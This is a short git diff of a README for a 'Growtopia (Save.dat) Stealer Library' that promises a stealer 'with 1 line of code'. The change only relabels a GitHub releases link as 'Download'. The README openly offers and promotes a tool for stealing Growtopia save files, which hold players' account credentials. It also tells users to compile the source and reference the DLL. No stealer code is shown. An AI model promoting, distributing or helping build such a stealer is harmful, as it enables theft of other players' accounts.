@@ -2,7 +2,7 @@
 Growtopia (Save.dat) Stealer Library that let you to write a stealer with 1 line of code.
 #### ⭐ If you like the project, feel free to star the project ⭐
 
-## Compiled Version: [All Releases](https://github.com/extatent/StealerLibrary/releases/)
+## Compiled Version: [Download](https://github.com/extatent/StealerLibrary/releases/)
 
 ### Compile the source code with Visual Studio and add the .DLL to the references in your project and start writting the code below.
 
